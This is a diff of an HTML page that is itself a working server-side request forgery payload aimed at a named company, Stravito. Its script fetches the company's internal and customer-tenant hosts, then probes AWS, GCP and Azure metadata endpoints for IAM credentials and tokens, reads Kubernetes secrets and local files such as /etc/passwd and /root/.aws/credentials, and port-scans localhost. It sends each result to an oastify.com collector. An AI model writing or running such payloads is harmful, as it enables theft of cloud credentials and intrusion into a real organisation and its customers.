@@ -1,101 +1,73 @@
 <!DOCTYPE html>
 <html>
-<img src="https://2hkrzi62zrpd84wpyjlmcx6f46axyxmm.oastify.com/check.png">
+<!-- SSRF probe: exfil via JS fetch -> Burp Collaborator -->
+<img src="https://xtugidit39jm7kmw4cl0ut51fslk99.oastify.com/loaded">
 <script>
-var endpoints = [
-  "https://api.stage.stravito.com",
-  "https://api.stravito.com",
-  "https://api.us.stravito.com",
-  "https://arcelik.stravito.com",
-  "https://assets.us.stravito.com",
-  "https://att.cloudfront.stravito.com",
-  "https://belgroup.api.stravito.com",
-  "https://bulk-upload.dev.stravito.com",
-  "https://bulk-upload.us.stravito.com",
-  "https://buyersconsole-unilever.api.stravito.com",
-  "https://calendar.stravito.com",
-  "https://campaign.stravito.com",
-  "https://cargillknowledgehub.api.stravito.com",
-  "https://carlsberg.api.stravito.com",
-  "https://cdn.stravito.com",
-  "https://compassioninternational.api.stravito.com",
-  "https://courthousesquare.stravito.com",
-  "https://customerinsightshub.api.stravito.com",
-  "https://danone-insighter.stravito.com",
-  "https://danone.stravito.com",
-  "https://data.dev.stravito.com",
-  "https://demo-prep-tenant.dev.stravito.com",
-  "https://demo-sky.api.stravito.com",
-  "https://demo-sky.stravito.com",
-  "https://dev.stravito.com",
-  "https://edwards.stravito.com",
-  "https://essity.api.stravito.com",
-  "https://eu.dev.stravito.com",
-  "https://eu.prod.stravito.com",
-  "https://eu.stage.stravito.com",
-  "https://eu.stravito.com",
-  "https://eu.tracking.stravito.com",
-  "https://externalmocks.stravito.com",
-  "https://fc.cloudfront.stravito.com",
-  "https://fc.stravito.com",
-  "https://gen.stravito.com",
-  "https://google.api.stravito.com",
-  "https://internal.api.stravito.com",
-  "https://internal.stravito.com",
-  "https://k-hub.stravito.com",
-  "https://kim.api.stravito.com",
-  "https://levis.api.stravito.com",
-  "https://lexi.stravito.com",
-  "https://loblaw-insightsvault.stravito.com",
-  "https://mcdonalds.stravito.com",
-  "https://mymki.api.stravito.com",
-  "https://nederlandseloterij.api.stravito.com",
-  "https://pasta-card.api.dev.stravito.com",
-  "https://public.eu.dev.stravito.com",
-  "https://redchair.api.stravito.com",
-  "https://redchair.stravito.com",
-  "https://roche.cloudfront.stravito.com",
-  "https://rotaryresearchhub.api.stravito.com",
-  "https://rotaryresearchhub.stravito.com",
-  "https://screenshooter.dev.stravito.com",
-  "https://snowplow.eu.prod.stravito.com",
-  "https://snowplow.us.prod.stravito.com",
-  "https://stage.stravito.com",
-  "https://stravito.dev.stravito.com",
-  "https://td-test.api.stravito.com",
-  "https://test-demo-tenant-cli.dev.stravito.com",
-  "https://test-redirect.dev.stravito.com",
-  "https://test.dev.stravito.com",
-  "https://theforge.stravito.com",
-  "https://theinsightsgallery.stravito.com",
-  "https://theknowledgebar.stravito.com",
-  "https://tracking.dev.stravito.com",
-  "https://tracking.stage.stravito.com",
-  "https://tracking.stravito.com",
-  "https://us.prod.stravito.com",
-  "https://us.stravito.com",
-  "https://us.tracking.stravito.com",
-  "https://venturesedge.stravito.com",
-  "https://wcag.api.stravito.com",
-  "https://white-hat.api.stravito.com",
-  "https://wip.dev.stravito.com",
-  "https://aimed-guendouz0.github.io/qsdf.html"
-];
+var CB = 'https://xtugidit39jm7kmw4cl0ut51fslk99.oastify.com'\;
 
-for (var i = 0; i < endpoints.length; i++) {
-  try {
-    var r = new window.XMLHttpRequest();
-    r.open('GET', endpoints[i], false);
-    r.send();
-    var encoded = r.responseText ? btoa(unescape(encodeURIComponent(r.responseText))) : 'empty';
-    var x = new window.XMLHttpRequest();
-    x.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?ep=' + encodeURIComponent(endpoints[i]) + '&d=' + encoded, false);
-    x.send();
-  } catch(e) {
-    var xe = new window.XMLHttpRequest();
-    xe.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/error?ep=' + encodeURIComponent(endpoints[i]) + '&e=' + btoa(e.message), false);
-    xe.send();
-  }
+function exfil(tag, data) {
+  var enc;
+  try { enc = btoa(unescape(encodeURIComponent(String(data).slice(0, 3000)))); } catch(e) { enc = btoa(String(data).slice(0, 3000)); }
+  var url = CB + '/x?t=' + encodeURIComponent(tag) + '&d=' + enc;
+  new Image().src = url;
+  try { var x = new XMLHttpRequest(); x.open('GET', url, true); x.send(); } catch(e) {}
 }
+
+function probe(tag, url, opts) {
+  var t0 = Date.now();
+  fetch(url, opts || {})
+    .then(function(r) {
+      var s = r.status;
+      return r.text().then(function(body) { exfil(tag, 'HTTP ' + s + '\n' + body); });
+    })
+    .catch(function(e) { exfil(tag + ':ERR', e.message + ' [' + (Date.now()-t0) + 'ms]'); });
+}
+
+// ── AWS IMDSv1 ──────────────────────────────────────────────
+probe('aws-root',     'http://169.254.169.254/latest/meta-data/');
+probe('aws-iam-list', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
+probe('aws-userdata', 'http://169.254.169.254/latest/user-data');
+probe('aws-hostn',    'http://169.254.169.254/latest/meta-data/hostname');
+
+// ── AWS IMDSv2 ───────────────────────────────────────────────
+fetch('http://169.254.169.254/latest/api/token', {
+  method: 'PUT',
+  headers: {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
+}).then(function(r) { return r.text(); }).then(function(tok) {
+  exfil('imdsv2-token', tok);
+  probe('imdsv2-iam-list', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {headers:{'X-aws-ec2-metadata-token': tok}});
+}).catch(function(e) { exfil('imdsv2:ERR', e.message); });
+
+// ── GCP metadata ─────────────────────────────────────────────
+probe('gcp-all',   'http://metadata.google.internal/computeMetadata/v1/?recursive=true', {headers:{'Metadata-Flavor':'Google'}});
+probe('gcp-token', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {headers:{'Metadata-Flavor':'Google'}});
+probe('gcp-169',   'http://169.254.169.254/computeMetadata/v1/?recursive=true', {headers:{'Metadata-Flavor':'Google'}});
+
+// ── Azure IMDS ───────────────────────────────────────────────
+probe('azure-instance', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {headers:{'Metadata':'true'}});
+probe('azure-identity', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', {headers:{'Metadata':'true'}});
+
+// ── Kubernetes ───────────────────────────────────────────────
+probe('k8s-ns',      'http://kubernetes.default.svc/api/v1/namespaces/');
+probe('k8s-secrets', 'http://kubernetes.default.svc/api/v1/namespaces/default/secrets/');
+probe('k8s-token',   'file:///var/run/secrets/kubernetes.io/serviceaccount/token');
+
+// ── Sensitive files ──────────────────────────────────────────
+probe('etc-passwd',   'file:///etc/passwd');
+probe('proc-environ', 'file:///proc/self/environ');
+probe('aws-creds',    'file:///root/.aws/credentials');
+
+// ── Localhost port scan ──────────────────────────────────────
+[80,443,3000,4000,5000,8000,8080,8443,8888,9000,9200,6379,27017,5432,3306,2375].forEach(function(p) {
+  probe('lo:' + p, 'http://127.0.0.1:' + p + '/');
+});
+
+// ── Internal Stravito services ───────────────────────────────
+[
+  'https://screenshooter.dev.stravito.com/',
+  'https://internal.api.stravito.com/',
+  'https://internal.stravito.com/',
+  'https://data.dev.stravito.com/'
+].forEach(function(u) { probe('stravito:' + u, u); });
 </script>
 </html>
